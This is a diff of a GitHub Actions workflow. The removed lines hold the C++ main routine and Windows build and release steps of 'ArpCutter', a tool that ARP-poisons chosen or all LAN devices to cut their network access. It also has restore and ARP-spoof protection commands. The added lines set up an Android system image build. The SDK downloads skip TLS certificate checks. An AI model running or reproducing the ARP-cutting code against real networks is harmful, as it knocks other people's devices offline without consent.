-              uint32_t myIp = ipToU32(a.ip);
-
-              Spoofer sp;
-              sp.h = h; sp.myMac = a.mac; sp.myIp = myIp;
-              sp.gwMac = gwMac; sp.gwIp = gwIp;
-              sp.bothWay = o.both;
-
-              auto addTarget = [&](uint32_t ip, const Mac& mac) {
-                  if (ip == myIp || ip == gwIp) return;
-                  sp.add(ip, mac);
-                  printf("  + cat: %-16s (%s)\n", u32ToIp(ip).c_str(), mac.str().c_str());
-              };
-
-              printf("\n--- Muc tieu ---\n");
-              if (o.target == "all") {
-                  for (auto& d : db.devices)
-                      addTarget(ipToU32(d.ip), Mac::parse(d.mac));
-              } else {
-                  std::string t = o.target;
-                  uint32_t ip = 0;
-                  Mac m;
-
-                  if (!t.empty() && t[0] == '#') {
-                      Device* d = db.byIndex(atoi(t.c_str() + 1));
-                      if (!d) { logLine("ERR", "Khong co muc tieu nay."); pcap_close(h); return 1; }
-                      ip = ipToU32(d->ip);
-                      m  = Mac::parse(d->mac);
-                  } else if (t.find(':') != std::string::npos || t.size() == 12) {
-                      m = Mac::parse(t);
-                      Device* d = db.byMac(m.str());
-                      if (d) ip = ipToU32(d->ip);
-                      else {
-                          logLine("NET", "Chua biet IP cua MAC nay, dang quet ...");
-                          std::vector<Device> found;
-                          arpScan(h, a.mac, myIp, ipToU32(a.mask), found, 5000, false);
-                          for (auto& f : found) if (f.mac == m.str()) ip = ipToU32(f.ip);
-                      }
-                  } else {
-                      ip = ipToU32(t);
-                      Device* d = db.byIp(t);
-                      if (d) m = Mac::parse(d->mac);
-                      else if (!arpResolve(h, a.mac, myIp, ip, m)) {
-                          logLine("ERR", "Khong tim thay " + t);
-                          pcap_close(h);
-                          return 1;
-                      }
-                  }
-                  if (!ip || !m.valid()) {
-                      logLine("ERR", "Khong xac dinh duoc muc tieu.");
-                      pcap_close(h);
-                      return 1;
-                  }
-                  addTarget(ip, m);
-              }
-
-              if (sp.t_.empty()) { logLine("WARN", "Khong co muc tieu nao."); pcap_close(h); return 0; }
-
-              logLine("OK", "Bat dau ARP poison. Mang se bi cat.");
-              sp.start();
-
-              if (o.seconds > 0) {
-                  for (int i = o.seconds; i > 0 && g_run; i--) {
-                      printf("\r  con %3d giay ... (Ctrl+C de dung ngay)", i);
-                      fflush(stdout);
-                      Sleep(1000);
-                  }
-                  printf("\n");
-                  sp.stop();
-                  logLine("OK", "Da tra mang.");
-              } else {
-                  printf("\n  Nhan Enter de TRA MANG ...\n");
-                  std::string dummy;
-                  std::getline(std::cin, dummy);
-                  sp.stop();
-                  logLine("OK", "Da tra mang.");
-              }
-
-              pcap_close(h);
-              return 0;
-          }
-
-          static int cmdRestore(Adapter& a, Db& db) {
-              pcap_t* h = openAdapter(a);
-              if (!h) return 1;
-
-              Mac gwMac;
-              uint32_t gwIp = 0;
-              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }
-
-              Spoofer sp;
-              sp.h = h; sp.myMac = a.mac; sp.myIp = ipToU32(a.ip);
-              sp.gwMac = gwMac; sp.gwIp = gwIp;
-
-              for (auto& d : db.devices) {
-                  uint32_t ip = ipToU32(d.ip);
-                  if (ip && ip != gwIp && ip != sp.myIp) sp.add(ip, Mac::parse(d.mac));
-              }
-              sp.restore();
-              logLine("OK", "Da gui lai ARP dung cho " + std::to_string(sp.t_.size()) + " thiet bi.");
-              pcap_close(h);
-              return 0;
-          }
-
-          static int cmdProtect(Adapter& a, const Opts& o, bool watchOnly) {
-              pcap_t* h = openAdapter(a);
-              if (!h) return 1;
-
-              Mac gwMac;
-              uint32_t gwIp = 0;
-              if (!ensureGateway(h, a, gwMac, gwIp)) { pcap_close(h); return 1; }
-
-              if (!isAdmin())
-                  logLine("WARN", "Khong phai Admin - ARP tinh se khong hoat dong.");
-
-              if (watchOnly)
-                  watchRun(h, a.mac, ipToU32(a.ip), gwMac, gwIp, g_run);
-              else
-                  protectRun(h, a.mac, ipToU32(a.ip), gwMac, gwIp, o.block, true, g_run);
-
-              pcap_close(h);
-              return 0;
-          }
-
-          static int cmdUpdate(Db& db, const Opts& o) {
-              logLine("NET", "Dang kiem tra ban moi ...");
-              Release r = fetchLatestRelease();
-
-              db.lastCheck = todayStr();
-              db.save();
-
-              if (!r.ok) {
-                  logLine("WARN", "Khong lay duoc release (kiem tra GH_OWNER/GH_REPO).");
-                  return 1;
-              }
-
-              printf("  Ban hien tai : %s\n  Ban moi nhat : %s\n", APP_VERSION, r.version.c_str());
-
-              if (cmpVersion(APP_VERSION, r.version) >= 0) {
-                  logLine("OK", "Ban dang dung la moi nhat.");
-                  return 0;
-              }
-              logLine("WARN", "Co ban moi: " + r.version);
-              if (o.checkOnly) return 0;
-              applyUpdate(r);
-              return 0;
-          }
-
-          static void dailyAuto(Adapter& a, Db& db) {
-              if (db.lastScan != todayStr()) {
-                  logLine("NET", "Quet dinh ky hang ngay ...");
-                  cmdScan(a, db, true);
-              }
-              if (db.lastCheck != todayStr()) {
-                  Release r = fetchLatestRelease();
-                  db.lastCheck = todayStr();
-                  db.save();
-                  if (r.ok && cmpVersion(APP_VERSION, r.version) < 0)
-                      logLine("WARN", "Co ban moi " + r.version + " - dung lenh 'update' de cap nhat.");
-              }
-          }
-
-          int main(int argc, char** argv) {
-              SetConsoleOutputCP(65001);
-              SetConsoleCtrlHandler(ctrlHandler, TRUE);
-
-              WSADATA wsa{};
-              WSAStartup(MAKEWORD(2, 2), &wsa);
-
-              banner();
-              if (!isAdmin())
-                  logLine("WARN", "Hay chay bang quyen Administrator de ARP hoat dong dung.");
-
-              Opts o = parseArgs(argc, argv);
-              if (o.cmd == "help" || o.cmd == "-h" || o.cmd == "--help") { usage(); return 0; }
-
-              auto list = listAdapters();
-              Adapter* a = chooseAdapter(list, o.iface);
-              if (!a) { printAdapters(list); return 1; }
-
-              Db db;
-              db.load();
-
-              if (o.cmd.empty()) {
-                  dailyAuto(*a, db);
-                  printf("Card: %s (%s)   Router: %s   Thiet bi: %d\n\n",
-                         a->ip.c_str(), a->mac.str().c_str(),
-                         u32ToIp(defaultGateway(a->ip)).c_str(), (int)db.devices.size());
-                  usage();
-                  return 0;
-              }
-
-              if (o.cmd == "status")  return cmdStatus(list);
-              if (o.cmd == "scan")    return cmdScan(*a, db);
-              if (o.cmd == "list")    return cmdList(db, o.checkOnly);
-              if (o.cmd == "update")  return cmdUpdate(db, o);
-              if (o.cmd == "restore") return cmdRestore(*a, db);
-              if (o.cmd == "protect") return cmdProtect(*a, o, false);
-              if (o.cmd == "watch")   return cmdProtect(*a, o, true);
-              if (o.cmd == "cut") {
-                  if (o.target.empty()) { logLine("ERR", "Thieu muc tieu. Vi du: cut 192.168.1.15"); return 1; }
-                  if (db.devices.empty()) cmdScan(*a, db, true);
-                  return cmdCut(*a, db, o);
-              }
-
-              logLine("ERR", "Lenh khong hop le: " + o.cmd);
-              usage();
-              return 1;
-          }
-          '@ | Add-Content -Encoding utf8 src/main.cpp
-
-      - name: Npcap SDK + Build
-        shell: pwsh
-        run: |
-          $ErrorActionPreference = 'Stop'
-          $ProgressPreference    = 'SilentlyContinue'
-          New-Item -ItemType Directory -Force -Path obj, dist | Out-Null
-
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-          $url = "https://npcap.com/dist/npcap-sdk-1.13.zip"
-          $zip = "npcap-sdk.zip"
-          Remove-Item $zip -ErrorAction SilentlyContinue
-
-          Write-Host "== Tai Npcap SDK =="
-          $ok = $false
-          for ($i = 1; $i -le 3 -and -not $ok; $i++) {
-            try {
-              Invoke-WebRequest -Uri $url -OutFile $zip -SkipCertificateCheck -MaximumRedirection 5
-              $ok = (Test-Path $zip) -and ((Get-Item $zip).Length -gt 100000)
-            } catch {
-              Write-Host "  lan $i loi: $($_.Exception.Message)"
-              Start-Sleep -Seconds 3
-            }
-          }
-          if (-not $ok) {
-            & curl.exe -L -k --retry 3 --retry-delay 2 -o $zip $url
-            $ok = (Test-Path $zip) -and ((Get-Item $zip).Length -gt 100000)
-          }
-          if (-not $ok) { throw "Khong tai duoc Npcap SDK tu $url" }
-          Write-Host ("  OK: " + (Get-Item $zip).Length + " bytes")
-
-          Remove-Item npcap-sdk -Recurse -Force -ErrorAction SilentlyContinue
-          Expand-Archive $zip -DestinationPath npcap-sdk -Force
-
-          Write-Host "== Cay thu muc SDK =="
-          Get-ChildItem npcap-sdk | Select-Object -ExpandProperty Name
-          Get-ChildItem npcap-sdk\Include -ErrorAction SilentlyContinue |
-            Select-Object -First 20 -ExpandProperty Name
-
-          if (-not (Test-Path "npcap-sdk\Include\pcap.h"))    { throw "Thieu npcap-sdk\Include\pcap.h" }
-          if (-not (Test-Path "npcap-sdk\Lib\x64\wpcap.lib")) { throw "Thieu npcap-sdk\Lib\x64\wpcap.lib" }
-
-          $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
-          $vsPath  = & $vswhere -latest -products * `
-                       -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 `
-                       -property installationPath
-          if (-not $vsPath) { throw "Khong tim thay Visual Studio" }
-          $vcvars = Join-Path $vsPath 'VC\Auxiliary\Build\vcvars64.bat'
-
-          $srcs = (Get-ChildItem src\*.cpp | ForEach-Object { $_.FullName }) -join ' '
-          $inc  = (Resolve-Path "npcap-sdk\Include").Path
-          $lib  = (Resolve-Path "npcap-sdk\Lib\x64").Path
-
-          Write-Host "INCLUDE = $inc"
-          Write-Host "LIB     = $lib"
-          Write-Host "SRCS    = $srcs"
-
-          $cmdline = 'cl /nologo /std:c++17 /EHsc /O2 /MT /W3 /utf-8 /D_CRT_SECURE_NO_WARNINGS /I "' +
-                     $inc + '" ' + $srcs + ' /Fo:obj\ /Fe:dist\ArpCutter.exe /link /LIBPATH:"' +
-                     $lib + '" wpcap.lib Packet.lib ws2_32.lib iphlpapi.lib winhttp.lib advapi32.lib shell32.lib'
-
-          $bat = "@echo off`r`ncall `"$vcvars`" >nul`r`n$cmdline`r`n"
-          Set-Content -Encoding ascii build.bat $bat
-
-          Write-Host "== build.bat =="
-          Get-Content build.bat
-
-          Write-Host "== Build =="
-          & cmd.exe /c build.bat
-          if ($LASTEXITCODE -ne 0) { throw "Build that bai" }
-
-          $h = (Get-FileHash dist/ArpCutter.exe -Algorithm SHA256).Hash.ToLower()
-          "SHA256(ArpCutter.exe) = $h" | Set-Content -Encoding utf8 dist/checksums.txt
-          Get-ChildItem dist
-
-      - name: Upload artifact
+          ls -lh /build/out_nivi 2>/dev/null || echo "CHUA CO system.img (build chua xong / loi)"
+          tail -n 40 /build/ci_last.log || true
+          du -sh /build/ccache 2>/dev/null || true
+          df -h /build || true
+          /build/publish.sh || true      # cap nhat trang log lan cuoi
+
+      # Luu ccache de lan chay sau dung tiep (luon chay, ke ca khi build chua xong)
+      - name: Save ccache
+        if: always()
+        uses: actions/cache/save@v4
+        with:
+          path: /build/ccache
+          key: ${{ env.CACHE_KEY }}
+
+      - name: Upload system.img
+        if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: ArpCutter-${{ steps.build.outputs.VER }}
-          path: |
-            dist/ArpCutter.exe
-            dist/checksums.txt
-          if-no-files-found: error
+          name: Nivi-system-img
+          path: /build/out_nivi/*.img
+          if-no-files-found: ignore
+          retention-days: 3
 
-      - name: Publish Release
-        uses: softprops/action-gh-release@v2
+      - name: Upload log
+        if: always()
+        uses: actions/upload-artifact@v4
         with:
-          tag_name: v${{ steps.build.outputs.VER }}
-          name: "ArpCutter v${{ steps.build.outputs.VER }} - ${{ steps.build.outputs.DATE }}"
-          make_latest: true
-          files: |
-            dist/ArpCutter.exe
-            dist/checksums.txt
-          body: |
-            **ArpCutter v${{ steps.build.outputs.VER }}** - build tu dong ngay ${{ steps.build.outputs.DATE }}
-
-            Cat mang ARP cho LAN nha (VNPT).
-
-            - `scan` quet LAN, luu thiet bi theo MAC (MAC = ID), tu quet lai hang ngay
-            - `cut <ip|mac|#so|all>` cat / tra mang
-            - `protect --block` tu bao ve may ban + router khoi ARP spoof & ARP flood
-            - `update` tu tai ban moi
-
-            Can cai **Npcap** (npcap.com) va chay bang **Administrator**.
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          name: build-log
+          path: |
+            /build/ci_last.log
+            /build/make_full.log
+          if-no-files-found: ignore
+          retention-days: 3
